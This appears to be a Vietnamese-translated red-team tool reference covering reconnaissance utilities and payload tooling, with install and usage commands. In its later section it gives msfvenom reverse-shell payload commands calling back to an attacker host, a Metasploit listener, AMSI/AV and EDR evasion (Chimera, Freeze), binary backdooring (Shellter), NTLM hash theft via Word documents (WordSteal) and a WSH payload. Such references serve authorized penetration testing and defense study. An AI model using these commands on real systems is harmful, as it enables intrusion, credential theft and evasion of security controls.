**Lưu ý:** Các lệnh cài đặt tiêu chuẩn cho **Linux/macOS** hoặc hệ thống có **Git** và **Python** để tải xuống mã nguồn và cài đặt các thư viện Python cần thiết.

**Cách sử dụng:**

```python
python3 AORT.py -d google.com
```
**Lưu ý:** Lệnh này chạy script **AORT.py** với cờ `-d` để chỉ định tên miền mục tiêu, kích hoạt các module **recon** khác nhau được tích hợp sẵn trong công cụ.

![image](https://user-images.githubusercontent.com/100603074/192070398-aae0217d-69c4-460b-ae4c-51b045551268.png)

### [🔙](#tool-list)[**spoofcheck**](https://github.com/BishopFox/spoofcheck)

Một chương trình kiểm tra xem một tên miền có thể bị giả mạo nguồn gửi hay không. Chương trình kiểm tra các bản ghi **SPF** và **DMARC** để tìm các cấu hình yếu cho phép giả mạo. Ngoài ra, nó sẽ cảnh báo nếu tên miền có cấu hình **DMARC** gửi mail hoặc yêu cầu HTTP khi các email **SPF/DKIM** thất bại.

Các tên miền có thể bị giả mạo nếu bất kỳ điều kiện nào sau đây được đáp ứng:

- Thiếu bản ghi **SPF** hoặc **DMARC**
- Bản ghi **SPF** không bao giờ chỉ định `~all` hoặc `-all`
- Chính sách **DMARC** được đặt là `p=none` hoặc không tồn tại

**Cài đặt:**

```bash
git clone https://github.com/BishopFox/spoofcheck; cd spoofcheck; pip install -r requirements.txt
```
**Lưu ý:** Các lệnh cài đặt tiêu chuẩn cho **Linux/macOS** hoặc hệ thống có **Git** và **Python**.

**Cách sử dụng:**

```bash
./spoofcheck.py [DOMAIN]
```
**Lưu ý:** Chạy **script spoofcheck.py** với tên miền cần kiểm tra làm đối số.

![image](https://user-images.githubusercontent.com/100603074/208209744-dfff6dd6-f53c-41a2-b3b7-bfc6bfb9b521.png)

### [🔙](#tool-list)[**AWSBucketDump**](https://github.com/jordanpotti/AWSBucketDump)

**AWSBucketDump** là một công cụ để nhanh chóng liệt kê các **S3 bucket** của **AWS** nhằm tìm kiếm các tệp đáng chú ý. Nó tương tự như một công cụ **brute force** tên miền phụ nhưng được tạo ra đặc biệt cho **S3 bucket** và còn có thêm một số tính năng cho phép bạn **grep** các tệp, cũng như tải xuống các tệp đáng chú ý.

**Cài đặt:**

```
git clone https://github.com/jordanpotti/AWSBucketDump; cd AWSBucketDump; pip install -r requirements.txt
```
**Lưu ý:** Các lệnh cài đặt tiêu chuẩn cho **Linux/macOS** hoặc hệ thống có **Git** và **Python**.

**Cách sử dụng:**

```
usage: AWSBucketDump.py [-h] [-D] [-t THREADS] -l HOSTLIST [-g GREPWORDS] [-m MAXSIZE]

optional arguments:
  -h, --help    show this help message and exit
  -D            Download files. This requires significant diskspace
  -d            If set to 1 or True, create directories for each host w/ results
  -t THREADS    number of threads
  -l HOSTLIST
  -g GREPWORDS  Provide a wordlist to grep for
  -m MAXSIZE    Maximum file size to download.

 python AWSBucketDump.py -l BucketNames.txt -g interesting_Keywords.txt -D -m 500000 -d 1
```
**Lưu ý:** **Output help** của **script Python AWSBucketDump.py** cùng với ví dụ sử dụng cơ bản.

### [🔙](#tool-list)[**GitHarvester**](https://metac0rtex.me/)

Công cụ hay để tìm kiếm thông tin từ **GitHub** bằng **regex**, với khả năng tìm kiếm người dùng và/hoặc dự án **GitHub** cụ thể.

**Cài đặt:**

```
git clone https://github.com/metac0rtex/GitHarvester; cd GitHarvester
```
**Lưu ý:** Cài đặt tiêu chuẩn bằng **Git** trên **Linux/macOS**.

**Cách sử dụng:**

```
./githarvester.py
```
**Lưu ý:** Lệnh thực thi **script Python GitHarvester**. Công cụ thường hoạt động ở chế độ tương tác hoặc chấp nhận tham số.

### [🔙](#tool-list)[**truffleHog**](https://github.com/dxa4481/truffleHog)

**TruffleHog** là một công cụ quét các **git repository** và tìm kiếm các chuỗi có **entropy** cao và các mẫu có thể cho thấy sự hiện diện của bí mật, chẳng hạn như mật khẩu và khóa **API**. Với **TruffleHog**, bạn có thể nhanh chóng và dễ dàng tìm thấy thông tin nhạy cảm có thể đã vô tình được **commit** và **push** lên một **repository**.

**Cài đặt (Binaries):** [Liên kết](https://github.com/trufflesecurity/trufflehog/releases)
**Lưu ý:** Cách đơn giản nhất là tải tệp thực thi trực tiếp.

**Cài đặt (Go):**

```
git clone https://github.com/trufflesecurity/trufflehog.git; cd trufflehog; go install
```
**Lưu ý:** Cách cài đặt cho người dùng đã có môi trường **Go** và **Git**. **`go install`** sẽ build và cài đặt công cụ vào thư mục **bin** của **Go** workspace.

**Cách sử dụng:**

```
trufflehog https://github.com/trufflesecurity/test_keys
```
**Lưu ý:** Ví dụ chạy **trufflehog** trực tiếp để quét một **repository GitHub** cụ thể.

![image](https://user-images.githubusercontent.com/100603074/208212273-137cb6ef-b0e6-42f7-8fd3-ac6a5cfe6a40.png)

### [🔙](#tool-list)[**Dismap**](https://github.com/zhzyker/dismap)

**Dismap** là một công cụ khám phá và nhận dạng tài sản. Nó có thể nhanh chóng nhận dạng giao thức và thông tin vân tay kỹ thuật (**fingerprint**) như web/tcp/udp, định vị loại tài sản và phù hợp cho mạng nội bộ và mạng bên ngoài.

**Dismap** có một cơ sở dữ liệu quy tắc **fingerprint** đầy đủ, hiện bao gồm **fingerprint** giao thức **tcp/udp/tls** và hơn **4500** quy tắc **web fingerprint**, có thể nhận dạng **favicon**, **body**, **header**, v.v.

**Cài đặt:**

**Dismap** là một tệp nhị phân cho **Linux**, **MacOS** và **Windows**. Truy cập [Release](https://github.com/zhzyker/dismap/releases) để tải phiên bản tương ứng và chạy:

```bash
# Linux or MacOS
chmod +x dismap-0.3-linux-amd64
./dismap-0.3-linux-amd64 -h

# Windows
dismap-0.3-windows-amd64.exe -h
```
**Lưu ý:** Hướng dẫn cấp quyền thực thi cho file binary trên **Linux/macOS** và hiển thị màn hình trợ giúp cho cả hai nền tảng.

**Cách sử dụng:**

```bash
# Quét mạng con 192.168.1.1
./dismap -i 192.168.1.1/24

# Quét, xuất kết quả ra result.txt và xuất json ra result.json
./dismap -i 192.168.1.1/24 -o result.txt -j result.json

# Quét, không sử dụng ICMP/PING để phát hiện máy chủ đang hoạt động, timeout 10 giây
./dismap -i 192.168.1.1/24 --np --timeout 10

# Quét, số luồng đồng thời 1000
./dismap -i 192.168.1.1/24 -t 1000
```
**Lưu ý:** Các ví dụ về cách sử dụng **Dismap** với các tùy chọn phổ biến để quét một dải IP (`-i`), lưu kết quả ra tệp (`-o`, `-j`), bỏ qua kiểm tra ping (`--np`) và điều chỉnh số luồng (`-t`).

![image](https://user-images.githubusercontent.com/100603074/210266012-ba3fadf8-5021-4690-a6d7-eda78bd5d50a.png)

*Hình ảnh được sử dụng từ https://github.com/zhzyker/dismap*

### [🔙](#tool-list)[**enum4linux**](https://github.com/CiscoCXSecurity/enum4linux)

Một công cụ để liệt kê thông tin từ các hệ thống **Windows** và **Samba**.

Nó có thể được sử dụng để thu thập nhiều loại thông tin, bao gồm:

- Thông tin về **Domain** và **Domain Controller**
- Thông tin người dùng và nhóm cục bộ
- Chia sẻ (**Shares**) và quyền chia sẻ (**share permissions**)
- Chính sách bảo mật (**Security policies**)
- Thông tin **Active Directory**

**Cài đặt: (Apt)**

```bash
sudo apt install enum4linux
```
**Lưu ý:** Cài đặt tiêu chuẩn trên **Linux/Debian/Ubuntu** sử dụng **apt**.

**Cài đặt: (Git)**

```bash
git clone https://github.com/CiscoCXSecurity/enum4linux
cd enum4linux
```
**Lưu ý:** Cài đặt từ mã nguồn bằng **Git**.

**Cách sử dụng:**

```bash
# 'Thực hiện mọi thứ'
enum4linux.pl -a 192.168.2.55

# Lấy danh sách tên người dùng (RestrictAnonymous = 0)
enum4linux.pl -U 192.168.2.55

# Lấy danh sách tên người dùng (sử dụng xác thực)
enum4linux.pl -u administrator -p password -U 192.168.2.55

# Get a list of groups and their members
enum4linux.pl -G 192.168.2.55

# Quét chi tiết (Verbose scan)
enum4linux.pl -v 192.168.2.55
```
**Lưu ý:** Đây là các ví dụ sử dụng **script perl enum4linux.pl** với các cờ phổ biến. `-a` cho phép chạy tất cả các kiểm tra, `-U` để liệt kê người dùng, `-u` và `-p` để cung cấp thông tin xác thực, `-G` để liệt kê nhóm và thành viên, `-v` để hiển thị chi tiết hơn. Công cụ chạy trên **Linux** nhắm vào hệ thống **Windows/Samba** từ xa.

Thông tin sử dụng đầy đủ có thể được tìm thấy trong [bài đăng trên blog](https://labs.portcullis.co.uk/tools/enum4linux/) này.

![image](https://user-images.githubusercontent.com/100603074/210266058-bf05f272-ff05-4e97-97e9-5d11b7ae01eb.png)

*Hình ảnh được sử dụng từ https://allabouttesting.org/samba-enumeration-for-penetration-testing-short-tutorial/*

### [🔙](#tool-list)[**skanuvaty**](https://github.com/Esc4iCEscEsc/skanuvaty)

Công cụ quét **dns/network/port** cực nhanh và nguy hiểm, được tạo bởi [Esc4iCEscEsc](https://github.com/Esc4iCEscEsc), viết bằng **rust**.

Bạn sẽ cần một tệp tên miền phụ (**subdomains file**). *Ví dụ: [Wordlist tên miền phụ của Sublist3r](https://raw.githubusercontent.com/aboul3la/Sublist3r/master/subbrute/names.txt)*.

**Cài đặt:**

Tải xuống phiên bản mới nhất từ [tại đây](https://github.com/Esc4iCEscEsc/skanuvaty/releases).
**Lưu ý:** Phương pháp đơn giản nhất là tải file binary phù hợp với hệ điều hành.

```bash
# Cài đặt một wordlist
sudo apt install wordlists
ls /usr/share/dirb/wordlists
ls /usr/share/amass/wordlists
```
**Lưu ý:** Các lệnh này cài đặt và liệt kê nội dung các thư mục **wordlist** phổ biến trên các hệ thống **Linux** dựa trên **Debian/Ubuntu**.

**Cách sử dụng:**

```bash
skanuvaty --target example.com --concurrency 16 --subdomains-file SUBDOMAIN_WORDLIST.txt
```
**Lưu ý:** Lệnh này chạy tệp nhị phân `skanuvaty`. `--target` chỉ định tên miền mục tiêu. `--concurrency` đặt số luồng đồng thời để quét nhanh hơn. `--subdomains-file` chỉ định tệp chứa danh sách tên miền phụ để kiểm tra.

![image](https://user-images.githubusercontent.com/100603074/210856146-42a4015c-f34b-4dc6-9e9b-cbeb4a43a964.png)

*Hình ảnh được sử dụng từ https://github.com/Esc4iCEscEsc/skanuvaty*

### [🔙](#tool-list)[**Metabigor**](https://github.com/j3ssie/metabigor)

**Metabigor** là công cụ Thông tin Tình báo (**Intelligence tool**), mục tiêu của nó là thực hiện các tác vụ **OSINT** và nhiều hơn nữa nhưng không cần bất kỳ khóa **API** nào.

**Các tính năng chính:**

- Tìm kiếm thông tin về **Địa chỉ IP, ASN** và Tổ chức.
- Wrapper để chạy **rustscan, masscan** và **nmap** hiệu quả hơn trên **IP/CIDR**.
- Tìm kiếm nhiều tên miền liên quan của mục tiêu bằng cách áp dụng các kỹ thuật khác nhau (chứng chỉ, whois, **Google Analytics**, etc).
- Get Summary about IP address (powered by [@thebl4ckturtle](https://github.com/theblackturtle))

**Cài đặt:**

```bash
go install github.com/j3ssie/metabigor@latest
```
**Lưu ý:** Yêu cầu cài đặt **Go** và cấu hình đúng path. Tải xuống và cài đặt vào thư mục bin của Go workspace.

**Cách sử dụng:**

```bash
# discovery IP of a company/organization
echo "company" | metabigor net --org -o /tmp/result.txt

# Getting more related domains by searching for certificate info
echo 'Target Inc' | metabigor cert --json | jq -r '.Domain' | unfurl format %r.%t | sort -u # this is old command

# Only run rustscan with full ports
echo '1.2.3.4/24' | metabigor scan -o result.txt

# Reverse Whois to find related domains
echo 'example.com' | metabigor related -s 'whois'

# Get Google Analytics ID directly from the URL
echo 'https://example.com' | metabigor related -s 'google-analytic'
```
**Lưu ý:** Các ví dụ về cách sử dụng `metabigor` với các subcommand khác nhau (`net`, `cert`, `scan`, `related`) để thực hiện các tác vụ OSINT khác nhau. Sử dụng cú pháp piping (`|`) phổ biến trên **Linux/macOS** để truyền kết quả từ lệnh này sang lệnh khác. Yêu cầu các công cụ như `jq` và `unfurl` (cho ví dụ `cert`) cũng được cài đặt.

![image](https://user-images.githubusercontent.com/100603074/210982590-44d58bfc-3b1b-4e11-b8f3-58c5a517626d.png)

*Hình ảnh được sử dụng từ https://github.com/j3ssie/metabigor*

### [🔙](#tool-list)[**Gitrob**](https://github.com/michenriksen/gitrob)

**Gitrob** là một công cụ giúp tìm kiếm các tệp có khả năng nhạy cảm được đẩy lên các **repository** công khai trên **Github**.

**Gitrob** sẽ nhân bản các **repository** thuộc về một người dùng hoặc tổ chức đến độ sâu có thể cấu hình và lặp qua lịch sử commit và đánh dấu các tệp khớp với chữ ký cho các tệp có khả năng nhạy cảm.

Các kết quả sẽ được trình bày thông qua giao diện web để duyệt và phân tích dễ dàng.

**Lưu ý:** *Gitrob sẽ cần một **token truy cập Github** để tương tác với **Github API**. [Tạo một **token truy cập cá nhân**](https://help.github.com/articles/creating-a-personal-access-token-for-the-command-line/) và lưu nó vào biến môi trường trong tệp `.bashrc` của bạn hoặc tệp cấu hình shell tương tự:*

```bash
export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
```
**Lưu ý:** Đây là cú pháp đặt biến môi trường trong bash (phổ biến trên **Linux/macOS**). Token truy cập cá nhân được lưu trữ nhạy cảm và không nên được chia sẻ công khai.

**Cài đặt: (Go)**

```bash
go get github.com/michenriksen/gitrob
```
**Lưu ý:** Yêu cầu cài đặt **Go** và cấu hình đúng path. Tải xuống và cài đặt vào thư mục bin của Go workspace.

**Cài đặt: (Binary)**

Một [phiên bản biên dịch sẵn](https://github.com/michenriksen/gitrob/releases) có sẵn cho mỗi bản phát hành.

**Cách sử dụng:**

```bash
# Run against org
gitrob {org_name}

# Saving session to a file
gitrob -save ~/gitrob-session.json acmecorp

# Loading session from a file
gitrob -load ~/gitrob-session.json
```
**Lưu ý:** Các ví dụ sử dụng **công cụ gitrob**. `{org_name}` được thay thế bằng tên tổ chức GitHub mục tiêu. `-save` và `-load` được dùng để lưu/tải trạng thái phiên quét.

![image](https://user-images.githubusercontent.com/100603074/210982754-fb70db8f-0e0f-4c31-962f-ac89edc7e6a4.png)

*Hình ảnh được sử dụng từ https://www.uedbox.com/post/58828/*

### [🔙](#tool-list)[**gowitness**](https://github.com/sensepost/gowitness)

**Gowitness** là tiện ích chụp ảnh màn hình trang web được viết bằng **Golang**, sử dụng **Chrome Headless** để tạo ảnh chụp màn hình các giao diện web bằng dòng lệnh, với trình xem báo cáo tiện lợi để xử lý kết quả. Cả **Linux** và **macOS** đều được hỗ trợ, trong khi hỗ trợ **Windows** hoạt động chủ yếu.

**Cài đặt: (Go)**

```bash
go install github.com/sensepost/gowitness@latest
```
**Lưu ý:** Yêu cầu cài đặt **Go** và cấu hình đúng path.

Thông tin cài đặt đầy đủ có thể được tìm thấy [tại đây](https://github.com/sensepost/gowitness/wiki/Installation).

**Cách sử dụng:**

```bash
# Screenshot một trang web duy nhất
gowitness single https://www.google.com/

# Screenshot một cidr bằng 20 luồng
gowitness scan --cidr 192.168.0.0/24 --threads 20

# Screenshot các dịch vụ http đang mở từ một tệp namp
gowitness nmap -f nmap.xml --open --service-contains http

# Chạy server báo cáo
gowitness report serve
```
**Lưu ý:** Các ví dụ về các subcommand chính của **gowitness**. `single` chụp một URL duy nhất. `scan` chụp ảnh màn hình các địa chỉ trong một dải CIDR. `nmap` tích hợp với kết quả quét của **nmap** để chụp ảnh màn hình các dịch vụ web được phát hiện. `report serve` khởi động một web server để xem các ảnh chụp màn hình đã thu thập.

Thông tin sử dụng đầy đủ có thể được tìm thấy [tại đây](https://github.com/sensepost/gowitness/wiki/Usage).

![image](https://user-images.githubusercontent.com/100603074/212204666-d7dcac1b-0f1a-46b8-8938-d2e122c1436c.png)

*Hình ảnh được sử dụng từ https://github.com/sensepost/gowitness*

**Resource Development**
====================

### [🔙](#tool-list)[**remoteInjector**](https://github.com/JohnWoodman/remoteinjector)

Tiêm liên kết đến mẫu word từ xa vào tài liệu word.

Tiện ích dựa trên **Python** này sửa đổi liên kết `settings.xml.rels` của tệp **.docx** trỏ đến một mẫu **.dotm** được lưu trữ từ xa chứa macro **VBA**, thực thi khi tài liệu được mở và các macro được bật.

[Bài đăng trên Blog liên quan](https://john-woodman.com/research/vba-macro-remote-template-injection/)

**Cài đặt:**

```bash
git clone https://github.com/JohnWoodman/remoteinjector;cd remoteinjector
```
**Lưu ý:** Cài đặt tiêu chuẩn bằng **Git** và điều hướng đến thư mục của công cụ.

**Cách sử dụng:**

```bash
python3 remoteinjector.py -w https://example.com/template.dotm example.docx
```
**Lưu ý:** Lệnh này chạy **script Python remoteinjector.py** với cờ `-w` chỉ định URL của mẫu từ xa và đối số cuối cùng là tệp `.docx` sẽ bị sửa đổi.

### [🔙](#tool-list)[**Chimera**](https://github.com/tokyoneon/Chimera)

**Chimera** là một **script PowerShell** dùng để che giấu (**obfuscation**) nhằm bỏ qua **AMSI** và các giải pháp **antivirus**. Nó xử lý các **script PowerShell** độc hại được biết là gây kích hoạt **AV** và sử dụng kỹ thuật thay thế chuỗi (**string substitution**) và ghép biến (**variable concatenation**) để né tránh các chữ ký phát hiện thông thường.

**Cài đặt:**

```bash
sudo apt-get update && sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
sudo git clone https://github.com/tokyoneon/chimera /opt/chimera
sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/
sudo chmod +x chimera.sh; ./chimera.sh --help
```
**Lưu ý:** Các lệnh cài đặt dependency (`sed`, `xxd`, ...) và mã nguồn của **Chimera** trên các hệ thống **Linux/Debian/Ubuntu** sử dụng **apt** và **Git**. `sudo` yêu cầu quyền **super user**. Chú ý các lệnh thay đổi quyền sở hữu và thực thi.

**Cách sử dụng:**

```bash
./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\
copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\
invoke-expression,out-string,write-error -j -g -k -r -p
```
**Lưu ý:** Ví dụ sử dụng **script bash chimera.sh** với nhiều tùy chọn khác nhau để che giấu một tệp **PowerShell** cụ thể (`-f`), đặt mức độ che giấu (`-l`), lưu kết quả ra tệp (`-o`), bật chế độ chi tiết (`-v`), chỉ định các loại chuyển đổi/mục tiêu che giấu (`-t`, `-c`, `-i`, `-h`, `-s`, `-b`, `-j`, `-g`, `-k`, `-r`, `-p`). Đây là một lệnh phức tạp thể hiện sự đa dạng trong tùy chọn che giấu.

![image](https://user-images.githubusercontent.com/100603074/209867736-5c35cec0-9227-4f18-a439-a5c954342818.png)

### [🔙](#tool-list)[**msfvenom**](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)

**Msfvenom** cho phép tạo các **payload** cho các hệ điều hành khác nhau với nhiều định dạng đa dạng. Nó cũng hỗ trợ che giấu **payload** để bỏ qua AV.

**Thiết lập Listener**

```shell
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-ip
set LPORT listening-port
run
```
**Lưu ý:** Đây là các lệnh trong **Metasploit Framework** để thiết lập một **listener** chung (`exploit/multi/handler`) lắng nghe các kết nối ngược lại. Bạn chọn loại **payload** mong đợi (`windows/meterpreter/reverse_tcp`), đặt địa chỉ IP (`LHOST`) và cổng (`LPORT`) mà listener sẽ lắng nghe, sau đó chạy nó (`run`).

#### Lệnh Msfvenom

**PHP:**

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost =192.168.0.9 lport=1234 R
```
**Lưu ý:** Tạo **payload PHP** (**reverse shell meterpreter**). `-p` chỉ định payload. `lhost` và `lport` là địa chỉ/cổng của máy attacker lắng nghe. `R` có thể là lỗi đánh máy hoặc một cờ không chuẩn, thường không cần thiết cho payload PHP cơ bản.

**Windows:**

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```
**Lưu ý:** Tạo **payload** (**reverse shell**) cho **Windows**, định dạng **EXE** (`-f exe`). `LHOST` và `LPORT` là địa chỉ/cổng của listener. Kết quả được xuất ra tệp `shell-x86.exe`. Đây là **payload** 32-bit cơ bản.

**Linux:**

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```
**Lưu ý:** Tương tự như trên, nhưng tạo **payload reverse shell** 32-bit cho **Linux** định dạng **ELF** (`-f elf`).

**Java:**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```
**Lưu ý:** Tạo **payload** (**reverse shell**) cho **Java** định dạng **JSP** (`-f raw`), thích hợp để triển khai trên các web server Java (ví dụ: Tomcat).

**HTA:**

```bash
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > shell.hta
```
**Lưu ý:** Tạo **payload** (**reverse shell**) cho **Windows** dưới dạng ứng dụng **HTA** (**HTML Application**) sử dụng **PowerShell** (`-f hta-psh`). Tệp **HTA** này có thể được chạy trực tiếp trên **Windows** và thường bỏ qua một số hạn chế thực thi **script**.

![image](https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png)

### [🔙](#tool-list)[**Shellter**](https://www.shellterproject.com/)

**Shellter** là một **công cụ** tiêm **shellcode** động và là trình lây nhiễm PE động đầu tiên được tạo ra.

Nó có thể được sử dụng để tiêm **shellcode** vào các ứng dụng Windows gốc (hiện tại chỉ hỗ trợ ứng dụng 32-bit).

**Shellter** tận dụng cấu trúc ban đầu của tệp PE và không áp dụng bất kỳ sửa đổi nào như thay đổi quyền truy cập bộ nhớ trong các section (trừ khi người dùng muốn), thêm section phụ với quyền truy cập RWE, và whatever would look dodgy under an AV scan.

Thông tin **README** đầy đủ có thể được tìm thấy [tại đây](https://www.shellterproject.com/Downloads/Shellter/Readme.txt).

**Cài đặt: (Kali)**

```bash
apt-get update
apt-get install shellter
```
**Lưu ý:** Cài đặt tiêu chuẩn trên **Kali Linux** hoặc các hệ thống **Debian/Ubuntu** bằng **apt**.

**Cài đặt: (**Windows**)**

Truy cập [trang tải xuống](https://www.shellterproject.com/download/) và cài đặt.

**Cách sử dụng:**

Just pick a legit binary to backdoor and run Shellter.

Some nice tips can be found [here](https://www.shellterproject.com/tipstricks/).

Lots of community usage demos can be found [here](https://www.shellterproject.com/shellter-community-demos/).

![image](https://user-images.githubusercontent.com/100603074/216729343-612cde48-0ce1-48e6-b342-5252193a974c.png)

*Hình ảnh được sử dụng từ https://www.kali.org/tools/shellter/images/shellter.png*

### [🔙](#tool-list)[**Freeze**](https://github.com/optiv/Freeze)

**Freeze** là một **công cụ** tạo **payload** được sử dụng để vượt qua các biện pháp kiểm soát bảo mật **EDR** để thực thi **shellcode** một cách lén lút.

**Freeze** sử dụng nhiều kỹ thuật không chỉ để loại bỏ các **hook EDR** ở mức **Userland** mà còn thực thi **shellcode** theo cách né tránh các biện pháp giám sát điểm cuối khác.

**Cài đặt:**

```bash
git clone https://github.com/optiv/Freeze
cd Freeze
go build Freeze.go
```
**Lưu ý:** Các lệnh cài đặt tiêu chuẩn cho hệ thống có cài đặt **Git** và **Go** để tải mã nguồn và build file thực thi.

**Cách sử dụng:**

```
  -I string
        Đường dẫn đến shellcode raw 64-bit.
  -O string
        Tên tệp đầu ra (ví dụ: loader.exe hoặc loader.dll). Tùy thuộc vào phần mở rộng tệp được xác định, Freeze sẽ tạo ra dll hoặc exe.
  -console
        Chỉ dành cho Binary Payload - Tạo thông tin console chi tiết khi payload được thực thi. Điều này sẽ vô hiệu hóa tính năng cửa sổ ẩn.
  -encrypt
        Mã hóa shellcode bằng mã hóa AES 256
  -export string
        Chỉ dành cho DLL Loaders - Chỉ định một hàm Export cụ thể cho loader.
  -process string
        Tên của tiến trình sẽ tạo ra. Tiến trình này phải tồn tại trong C:\Windows\System32\. Ví dụ 'notepad.exe' (mặc định "notepad.exe")
  -sandbox
        Cho phép né tránh sandbox bằng cách kiểm tra:
                Điểm cuối có tham gia domain không?
                Điểm cuối có nhiều hơn 2 CPU không?
                Điểm cuối có nhiều hơn 4 GB RAM không?
  -sha256
        Cung cấp giá trị SHA256 của loader (Điều này hữu ích cho việc theo dõi)
```
**Lưu ý:** Đây là output màn hình trợ giúp của **công cụ Freeze**, liệt kê các tham số dòng lệnh để tạo payload. Bạn cung cấp shellcode input (`-I`), tên file output (`-O`), và có thể chỉ định các kỹ thuật evasive (`-process`, `-sandbox`), mã hóa (`-encrypt`), v.v.

![image](https://user-images.githubusercontent.com/100603074/216729312-6e03f5d2-29a7-4190-8187-daecebfc6a9c.png)

*Hình ảnh được sử dụng từ https://www.blackhatethicalhacking.com/tools/freeze/*

### [🔙](#tool-list)[**WordSteal**](https://github.com/0x09AL/WordSteal)

**Script** này sẽ tạo một tài liệu **Microsoft Word** với một hình ảnh từ xa (**remote image**), cho phép thu thập các hash **NTLM** từ một điểm cuối mục tiêu từ xa.

**Microsoft Word** có khả năng bao gồm các hình ảnh từ các vị trí từ xa, bao gồm cả hình ảnh từ xa được lưu trữ trên một **SMB server** do kẻ tấn công kiểm soát. Điều này tạo cơ hội để bạn lắng nghe và thu thập các hash **NTLM** được gửi khi một nạn nhân đã xác thực mở tài liệu **Word** và hiển thị hình ảnh.

**Cài đặt:**

```
git clone https://github.com/0x09AL/WordSteal
cd WordSteal
```
**Lưu ý:** Cài đặt tiêu chuẩn bằng **Git** và chuyển vào thư mục của công cụ. Yêu cầu cài đặt **Python**.

**Cách sử dụng:**

```bash
# Generate document containing 'test.jpg' and start listener
./main.py 127.0.0.1 test.jpg 1

# Generate document containing 'test.jpg' and do not start listener
./main.py 127.0.0.1 test.jpg 0\n
```
**Lưu ý:** Các ví dụ chạy **script Python main.py**. Tham số là IP của máy attacker lắng nghe **SMB**, tên file ảnh dummy (test.jpg) và một cờ (1 để bắt đầu listener, 0 để không). Tệp `.docx` được tạo sẽ chứa tham chiếu đến ảnh tại `\\<attacker_ip>\test.jpg`. Máy attacker cần có **server SMB** và **tool** bắt **hash** (ví dụ: **Responder**) hoạt động trên IP đã cung cấp.

![image](https://user-images.githubusercontent.com/100603074/217653886-09bf9eba-a117-47b9-99b4-12fb2d73ef44.png)

*Hình ảnh được sử dụng từ https://pentestit.com/wordsteal-steal-ntlm-hashes-remotely/*

### [🔙](#tool-list)[**Hàm NTAPI chưa được tài liệu hóa**](http://undocumented.ntinternals.net/)

Trang web này cung cấp thông tin về các nội bộ Windows chưa được tài liệu hóa, các cuộc gọi hệ thống, cấu trúc dữ liệu và các chi tiết cấp thấp khác của hệ điều hành Windows.

Đây có thể là một nguồn tài nguyên quý giá cho những cá nhân muốn khám phá nội bộ của **Windows** vì nhiều mục đích, bao gồm phân tích lỗ hổng, phát triển khai thác và nâng quyền cục bộ.

Khi phát triển khai thác, việc hiểu rõ nội bộ của hệ thống mục tiêu là rất quan trọng. Trang web này có thể giúp phát triển khai thác bằng cách tận dụng các khía cạnh cấp thấp chưa được tài liệu hóa của **Windows**.

**Cách sử dụng:**

Truy cập [http://undocumented.ntinternals.net/](http://undocumented.ntinternals.net/)

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/41b424f3-053c-440b-b0fd-235e95980d9a)

*Hình ảnh được sử dụng từ http://undocumented.ntinternals.net/*

### [🔙](#tool-list)[**Hàm Kernel Callback Functions**](https://codemachine.com/articles/kernel_callback_functions.html)

Ghi chú kỹ thuật này cung cấp danh sách đầy đủ tất cả các **API** được xuất bởi **Windows Kernel**, cho phép trình điều khiển đăng ký các hàm **callback** được gọi bởi các thành phần kernel trong nhiều tình huống khác nhau.

Hầu hết các **routine** này đều được tài liệu hóa trong **Windows Driver Kit (WDK)** nhưng một số được dùng cho các trình điều khiển sẵn có (**in-box drivers**).

Các hàm chưa được tài liệu hóa được mô tả ngắn gọn trong khi các hàm đã được tài liệu hóa chỉ được liệt kê ở đây để tham khảo.

**Cách sử dụng:**

Truy cập [https://codemachine.com/articles/kernel_callback_functions.html](https://codemachine.com/articles/kernel_callback_functions.html)

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/b7532b7d-1abc-4af6-be92-f6f78d24a788)

*Hình ảnh được sử dụng từ https://codemachine.com*

### [🔙](#tool-list)[**OffensiveVBA**](https://github.com/S3cur3Th1sSh1t/OffensiveVBA)

Một bộ sưu tập các kỹ thuật tấn công, **script** và liên kết hữu ích để thực hiện thực thi mã và né tránh phòng thủ thông qua các macro **Office**.

**Cách sử dụng:**

Truy cập [https://github.com/S3cur3Th1sSh1t/OffensiveVBA#templates-in-this-repo](https://github.com/S3cur3Th1sSh1t/OffensiveVBA#templates-in-this-repo)

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/7f7ad942-48d7-42e7-a3cc-55ec84139058)

*Hình ảnh được sử dụng từ https://github.com/S3cur3Th1sSh1t*

### [🔙](#tool-list)**WSH**

**Tạo payload:**

```vbs
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```
**Lưu ý:** Đây là mã **VBScript** tạo đối tượng `WScript.Shell` và sử dụng phương thức `Run` để thực thi `calc.exe` (máy tính). Số `0` làm đối số thứ hai có nghĩa là cửa sổ chương trình sẽ ẩn. `WScript.ScriptFullName` có vẻ như được đưa vào như một phần của đường dẫn lệnh, điều này hơi lạ cho việc thực thi `calc.exe` đơn giản, có thể là ví dụ cho các tác vụ phức tạp hơn. Script này được thực thi bằng trình thông dịch `wscript.exe` hoặc `cscript.exe` của Windows Script Host (**WSH**).

**Execute:**

```bash
wscript payload.vbs
cscript.exe payload.vbs
wscript /e:VBScript payload.txt //If .vbs files are blacklisted
```
